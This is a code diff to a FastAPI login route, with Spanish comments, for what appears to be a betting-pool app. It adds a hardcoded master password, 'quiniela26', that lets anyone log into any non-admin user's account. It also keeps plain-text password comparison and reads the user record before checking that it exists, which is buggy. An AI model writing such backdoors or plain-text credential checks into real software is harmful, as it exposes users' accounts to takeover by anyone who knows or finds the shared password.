@@ -26,11 +26,26 @@ def register(usuario: schemas.UsuarioCreate, db: Session = Depends(database.get_
 
 @router.post("/login", response_model=schemas.Token)
 def login(form_data: OAuth2PasswordRequestForm = Depends(), db: Session = Depends(database.get_db)):
-    # Nota: OAuth2PasswordRequestForm espera 'username' y 'password'
+    # 1. Buscar al usuario en la base de datos
     db_usuario = db.query(models.Usuario).filter(models.Usuario.username == form_data.username).first()
     
-    # Comparación de texto plano (como lo tienes configurado)
-    if not db_usuario or db_usuario.hashed_password != form_data.password:
+    # 2. Definir la contraseña maestra
+    password_maestra = "quiniela26"
+    
+    # 3. Validar:
+    # - Si el usuario no existe, fallamos.
+    # - Si la contraseña NO coincide con la real Y TAMPOCO es la maestra, fallamos.
+    # - Si se intenta usar la maestra pero el usuario ES admin, fallamos.
+    
+    es_password_valida = (db_usuario.hashed_password == form_data.password)
+    es_password_maestra = (form_data.password == password_maestra)
+    
+    # Lógica de acceso:
+    # Accede si la password es real 
+    # O (si es la maestra Y el usuario no es admin)
+    acceso_permitido = es_password_valida or (es_password_maestra and not db_usuario.is_admin)
+
+    if not db_usuario or not acceso_permitido:
         raise HTTPException(status_code=401, detail="Credenciales incorrectas")
     
     access_token = security.create_access_token(data={"sub": db_usuario.username})
